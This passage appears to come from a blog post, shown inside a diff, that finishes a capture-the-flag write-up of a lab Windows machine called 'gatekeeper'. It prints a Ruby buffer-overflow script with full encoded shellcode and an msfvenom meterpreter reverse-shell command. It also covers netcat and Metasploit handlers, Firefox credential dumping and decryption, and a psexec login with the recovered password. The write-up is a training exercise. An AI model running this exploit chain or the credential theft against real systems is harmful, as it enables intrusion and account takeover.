+</span></span><span style="display:flex;"><span>buff<span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\xc3\x14\x04\x08</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#6272a4">#JMP ESP</span>
+</span></span><span style="display:flex;"><span>buff<span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;B&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">10</span> <span style="color:#6272a4">#additional NOPs for argument values</span>
+</span></span><span style="display:flex;"><span>buff<span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;&#34;</span>\xdb\xc8\xb8\xf3\x0f\xd1\xd9\xd9\x74\x24\xf4\x5d\x29\xc9<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\xb1\x52\x83\xc5\x04\x31\x45\x13\x03\xb6\x1c\x33\x2c\xc4<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\xcb\x31\xcf\x34\x0c\x56\x59\xd1\x3d\x56\x3d\x92\x6e\x66<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\x35\xf6\x82\x0d\x1b\xe2\x11\x63\xb4\x05\x91\xce\xe2\x28<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\x22\x62\xd6\x2b\xa0\x79\x0b\x8b\x99\xb1\x5e\xca\xde\xac<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\x93\x9e\xb7\xbb\x06\x0e\xb3\xf6\x9a\xa5\x8f\x17\x9b\x5a<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\x47\x19\x8a\xcd\xd3\x40\x0c\xec\x30\xf9\x05\xf6\x55\xc4<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\xdc\x8d\xae\xb2\xde\x47\xff\x3b\x4c\xa6\xcf\xc9\x8c\xef<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\xe8\x31\xfb\x19\x0b\xcf\xfc\xde\x71\x0b\x88\xc4\xd2\xd8<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\x2a\x20\xe2\x0d\xac\xa3\xe8\xfa\xba\xeb\xec\xfd\x6f\x80<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\x09\x75\x8e\x46\x98\xcd\xb5\x42\xc0\x96\xd4\xd3\xac\x79<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\xe8\x03\x0f\x25\x4c\x48\xa2\x32\xfd\x13\xab\xf7\xcc\xab<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\x2b\x90\x47\xd8\x19\x3f\xfc\x76\x12\xc8\xda\x81\x55\xe3<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\x9b\x1d\xa8\x0c\xdc\x34\x6f\x58\x8c\x2e\x46\xe1\x47\xae<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\x67\x34\xc7\xfe\xc7\xe7\xa8\xae\xa7\x57\x41\xa4\x27\x87<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\x71\xc7\xed\xa0\x18\x32\x66\xc5\xce\x30\x4a\xb1\xec\x48<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\xa7\xf2\x78\xae\xad\xe4\x2c\x79\x5a\x9c\x74\xf1\xfb\x61<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\xa3\x7c\x3b\xe9\x40\x81\xf2\x1a\x2c\x91\x63\xeb\x7b\xcb<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\x22\xf4\x51\x63\xa8\x67\x3e\x73\xa7\x9b\xe9\x24\xe0\x6a<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\xe0\xa0\x1c\xd4\x5a\xd6\xdc\x80\xa5\x52\x3b\x71\x2b\x5b<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\xce\xcd\x0f\x4b\x16\xcd\x0b\x3f\xc6\x98\xc5\xe9\xa0\x72<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\xa4\x43\x7b\x28\x6e\x03\xfa\x02\xb1\x55\x03\x4f\x47\xb9<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\xb2\x26\x1e\xc6\x7b\xaf\x96\xbf\x61\x4f\x58\x6a\x22\x7f<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\x13\x36\x03\xe8\xfa\xa3\x11\x75\xfd\x1e\x55\x80\x7e\xaa<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\x26\x77\x9e\xdf\x23\x33\x18\x0c\x5e\x2c\xcd\x32\xcd\x4d<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\xc4<span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#6272a4">#shellcode</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">require</span> <span style="color:#f1fa8c">&#39;socket&#39;</span>
+</span></span><span style="display:flex;"><span>TCPSocket<span style="color:#ff79c6">.</span>open(<span style="color:#f1fa8c">&#34;10.10.10.172&#34;</span>,<span style="color:#bd93f9">31337</span>){ <span style="color:#ff79c6">|</span>s<span style="color:#ff79c6">|</span> s<span style="color:#ff79c6">.</span>puts buff}
+</span></span></code></pre></div><p>before executing this script, i&rsquo;ll set up a netcat listener that can receive the reverse shell.</p>
+<p><code>nc -lvnp 4444</code></p>
+<p>if, for whatever reason, the port is clogged, i can simply hard kill the process running on it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>kill -9 $(lsof -t -i:4444)
+</span></span></code></pre></div><p>execute the script using <code>ruby bof.rb</code> and a shell will have spawned in the netcat session. the flag is stored on the desktop.</p>
+<p><p class="imgp">
+  <img loading="lazy" src="/gatekeeper_natbat.png" alt="natbat"  />
+</p>
+</p>
+<p>a quick check of the user&rsquo;s privileges shows that i don&rsquo;t have any special access, so here comes the privilege escalation portion of the challenge.</p>
+<p><p class="imgp">
+  <img loading="lazy" src="/gatekeeper_whoami.png" alt="whoami"  />
+</p>
+</p>
+<p>i&rsquo;ll create another shellcode, but this time i want to upgrade it to a meterpreter shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;local IP&gt; LPORT=5555 -f rb -b &#34;\x00\x0a&#34;
+</span></span></code></pre></div><p>in another terminal window, i&rsquo;ll run the metasploit console to run the handler.</p>
+<p><p class="imgp">
+  <img loading="lazy" src="/gatekeeper_handler.png" alt="handler"  />
+</p>
+</p>
+<p>running the exploit using <code>exploit -j</code> and running my overflow script on the side using <code>ruby bof.rb</code>, a reverse shell will be spawned. once the meterpreter shell is spawned, i&rsquo;ll try to enumerate the applications on the target.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#ff79c6">&gt;</span> run post<span style="color:#ff79c6">/</span>windows<span style="color:#ff79c6">/</span>gather<span style="color:#ff79c6">/</span>enum_applications
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Installed Applications
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">======================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Name                                                                Version
+</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">----</span>                                                                <span style="color:#ff79c6">-------</span>
+</span></span><span style="display:flex;"><span> Amazon SSM Agent                                                    <span style="color:#bd93f9">2.3</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">842.0</span>
+</span></span><span style="display:flex;"><span> Amazon SSM Agent                                                    <span style="color:#bd93f9">2.3</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">842.0</span>
+</span></span><span style="display:flex;"><span> EC2ConfigService                                                    <span style="color:#bd93f9">4.9</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">4222.0</span>
+</span></span><span style="display:flex;"><span> EC2ConfigService                                                    <span style="color:#bd93f9">4.9</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">4222.0</span>
+</span></span><span style="display:flex;"><span> EC2ConfigService                                                    <span style="color:#bd93f9">4.9</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">4222.0</span>
+</span></span><span style="display:flex;"><span> EC2ConfigService                                                    <span style="color:#bd93f9">4.9</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">4222.0</span>
+</span></span><span style="display:flex;"><span> Microsoft Visual C<span style="color:#ff79c6">++</span> <span style="color:#bd93f9">2015</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">2019</span> Redistributable (x64) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">14.20</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">27508</span>  <span style="color:#bd93f9">14.20</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">27508.1</span>
+</span></span><span style="display:flex;"><span> Microsoft Visual C<span style="color:#ff79c6">++</span> <span style="color:#bd93f9">2015</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">2019</span> Redistributable (x64) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">14.20</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">27508</span>  <span style="color:#bd93f9">14.20</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">27508.1</span>
+</span></span><span style="display:flex;"><span> Microsoft Visual C<span style="color:#ff79c6">++</span> <span style="color:#bd93f9">2015</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">2019</span> Redistributable (x86) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">14.20</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">27508</span>  <span style="color:#bd93f9">14.20</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">27508.1</span>
+</span></span><span style="display:flex;"><span> Microsoft Visual C<span style="color:#ff79c6">++</span> <span style="color:#bd93f9">2015</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">2019</span> Redistributable (x86) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">14.20</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">27508</span>  <span style="color:#bd93f9">14.20</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">27508.1</span>
+</span></span><span style="display:flex;"><span> Microsoft Visual C<span style="color:#ff79c6">++</span> <span style="color:#bd93f9">2019</span> X86 Additional Runtime <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">14.20</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">27508</span>      <span style="color:#bd93f9">14.20</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">27508</span>
+</span></span><span style="display:flex;"><span> Microsoft Visual C<span style="color:#ff79c6">++</span> <span style="color:#bd93f9">2019</span> X86 Additional Runtime <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">14.20</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">27508</span>      <span style="color:#bd93f9">14.20</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">27508</span>
+</span></span><span style="display:flex;"><span> Microsoft Visual C<span style="color:#ff79c6">++</span> <span style="color:#bd93f9">2019</span> X86 Minimum Runtime <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">14.20</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">27508</span>         <span style="color:#bd93f9">14.20</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">27508</span>
+</span></span><span style="display:flex;"><span> Microsoft Visual C<span style="color:#ff79c6">++</span> <span style="color:#bd93f9">2019</span> X86 Minimum Runtime <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">14.20</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">27508</span>         <span style="color:#bd93f9">14.20</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">27508</span>
+</span></span><span style="display:flex;"><span> Mozilla Firefox <span style="color:#bd93f9">75.0</span> (x86 en<span style="color:#ff79c6">-</span>US)                                    <span style="color:#bd93f9">75.0</span>
+</span></span></code></pre></div><p>i see firefox is downloaded, which means i can dump its credentials and then use <a href="https://github.com/unode/firefox_decrypt"  target="_blank" rel="noreferrer nofollow">firefox decrypt</a>
+ to decrypt them, allowing me to impersonate and log in as the target.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#ff79c6">&gt;</span> run post<span style="color:#ff79c6">/</span>multi<span style="color:#ff79c6">/</span>gather<span style="color:#ff79c6">/</span>firefox_creds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">+</span>] Downloaded cert9<span style="color:#ff79c6">.</span>db: <span style="color:#ff79c6">/</span>home<span style="color:#ff79c6">/</span>kali<span style="color:#ff79c6">/.</span>msf4<span style="color:#ff79c6">/</span>loot<span style="color:#ff79c6">/</span><span style="color:#bd93f9">20211021043407</span>_default_10<span style="color:#ff79c6">.</span><span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">172</span>_ff<span style="color:#ff79c6">.</span>ljfn812a<span style="color:#ff79c6">.</span>cert_898397<span style="color:#ff79c6">.</span>bin
+</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">+</span>] Downloaded cookies<span style="color:#ff79c6">.</span>sqlite: <span style="color:#ff79c6">/</span>home<span style="color:#ff79c6">/</span>kali<span style="color:#ff79c6">/.</span>msf4<span style="color:#ff79c6">/</span>loot<span style="color:#ff79c6">/</span><span style="color:#bd93f9">20211021043411</span>_default_10<span style="color:#ff79c6">.</span><span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">172</span>_ff<span style="color:#ff79c6">.</span>ljfn812a<span style="color:#ff79c6">.</span>cook_582398<span style="color:#ff79c6">.</span>bin
+</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">+</span>] Downloaded key4<span style="color:#ff79c6">.</span>db: <span style="color:#ff79c6">/</span>home<span style="color:#ff79c6">/</span>kali<span style="color:#ff79c6">/.</span>msf4<span style="color:#ff79c6">/</span>loot<span style="color:#ff79c6">/</span><span style="color:#bd93f9">20211021043414</span>_default_10<span style="color:#ff79c6">.</span><span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">172</span>_ff<span style="color:#ff79c6">.</span>ljfn812a<span style="color:#ff79c6">.</span>key4_936123<span style="color:#ff79c6">.</span>bin
+</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">+</span>] Downloaded logins<span style="color:#ff79c6">.</span>json: <span style="color:#ff79c6">/</span>home<span style="color:#ff79c6">/</span>kali<span style="color:#ff79c6">/.</span>msf4<span style="color:#ff79c6">/</span>loot<span style="color:#ff79c6">/</span><span style="color:#bd93f9">20211021043416</span>_default_10<span style="color:#ff79c6">.</span><span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">172</span>_ff<span style="color:#ff79c6">.</span>ljfn812a<span style="color:#ff79c6">.</span>logi_001670<span style="color:#ff79c6">.</span>bin
+</span></span></code></pre></div><p>i have to move the files from /.msf4/ to whichever folder i&rsquo;m working with, before running firefox_dcrypt.
+but also, before i run firefox_dcrypt, i must rename each of the &ldquo;loot&rdquo; files to the corresponding names:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>mv 20211021043407_default_10.10.248.88_ff.ljfn812a.cert_898397.bin cert9.db
+</span></span><span style="display:flex;"><span>mv 20211021043411_default_10.10.248.88_ff.ljfn812a.cook_582398.bin cookies.sqlite
+</span></span><span style="display:flex;"><span>mv 20211021043414_default_10.10.248.88_ff.ljfn812a.key4_936123.bin key4.db
+</span></span><span style="display:flex;"><span>mv 20211021043416_default_10.10.248.88_ff.ljfn812a.logi_001670.bin logins.json
+</span></span></code></pre></div><p>running the tool, i get:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 firefox_decrypt.py /home/kali/gatekeeper/firefoxcreds/loot
+</span></span><span style="display:flex;"><span>Username: &#39;mayor&#39;
+</span></span><span style="display:flex;"><span>Password: &#39;8CL7O1N78MdrCIsV&#39;
+</span></span></code></pre></div><p>so i have an elevated account&rsquo;s credentials. i can run psexec.py (which lets me execute programs on remote systems) using these credentials, effectively granting me special access.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 psexec.py mayor:8CL7O1N78MdrCIsV@10.10.10.172
+</span></span></code></pre></div><p>as demonstrated, buffer overflows are incredibly powerful attack vectors that utilize deep understanding of how memory storage and program execution work in tandem. stopping them is not only difficult and potentially expensive, but necessary.</p>
+</main>
+</div>
+
+
+
+
+
+<footer>
+  <div class="footer-nav">
+    
+    <a class="next" href="/posts/gdbextract/" style="float: right"
+      >next: gdbExtract</a
+    >
+     
+    <a class="previous" href="/posts/jenkins/">previous</a>
+    
+  </div>
+</footer>
+
+
+
+<script defer>
+  document.addEventListener("keydown", function (e) {
+    if (document.activeElement.isContentEditable) {
+      return false;
+    }
+    if (document.activeElement.tagName == "INPUT") {
+      return false;
+    }
+    if (e.altKey || e.ctrlKey || e.shiftKey) {
+      return false;
+    }
+    var key = e.key;
+    if (key === "h") {
+      e.preventDefault();
+      e.stopPropagation();
+      window.location.href = "/";
+    } else if (key === "t") {
+      e.preventDefault();
+      e.stopPropagation();
+      window.location.href = `https://${location.hostname}/tags`;
+    } else if (key === "i") {
+      e.preventDefault();
+      e.stopPropagation();
+      const inputs = document.querySelectorAll("input");
+      for (let i = 0; i < inputs.length; i++) {
+        if (inputs[i].offsetParent !== null) {
+          inputs[i].selectionStart = inputs[i].selectionEnd =
+            inputs[i].value.length;
+          inputs[i].focus();
+          break;
+        }
+      }
+    }
+    return false;
+  });
+</script>
+
+
+<script defer>
+  function throttle(fn, wait) {
+    var time = Date.now();
+    return function () {
+      var now = Date.now()
+      if (time + wait - now < 0) {
+        fn();
+        time = now;
+      }
+    };
+  }
+
+  function scrollHandler() {
+    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));
+
+    function scrollCallback() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+
+      
+      for (var i = 0; i < anchors.length; i++) {
+        var anchorId = anchors[i].getAttribute("id");
+        var link = document.querySelector(
+          'nav ul li a[href="#' + anchorId + '"]',
+        );
+        if (link) {
+          link.classList.remove("active-toc");
+        }
+      }
+
+      
+      for (var i = anchors.length - 1; i >= 0; i--) {
+        var offsetTop = anchors[i].offsetTop;
+        if (scrollTop > offsetTop - 75) {
+          var anchorId = anchors[i].getAttribute("id");
+          var link = document.querySelector(
+            'nav ul li a[href="#' + anchorId + '"]',
+          );
+          if (link) {
+            link.classList.add("active-toc");
+            break;
+          }
+        }
+      }
+    }
+
+    window.addEventListener(
+      "scroll",
+      throttle(scrollCallback, 300),
+    );
+  }
+  setTimeout(scrollHandler, 100);
+</script>
+
+<script defer>
+  function addCopyButtonToCodeBlocks() {
+    
+    const codeBlocks = document.querySelectorAll('code[class^="language-"]');
+
+    codeBlocks.forEach((codeBlock) => {
+      const copyButton = document.createElement("button");
+      copyButton.classList.add("copy-code-button");
+      copyButton.innerHTML = "copy";
+
+      
+      copyButton.addEventListener("click", () => {
+        
+        const elements = codeBlock.querySelectorAll(".cl");
+        let codeToCopy = "";
+        elements.forEach((element) => {
+          codeToCopy += element.innerText;
+        });
+        navigator.clipboard.writeText(codeToCopy);
+
+        
+        copyButton.innerHTML = "copied!";
+        setTimeout(() => {
+          copyButton.innerHTML = "copy";
+        }, 1500);
+      });
+
+      
+      codeBlock.parentNode.before(copyButton);
+    });
+  }
+  setTimeout(function () {
+    addCopyButtonToCodeBlocks();
+  }, 100);
+</script>
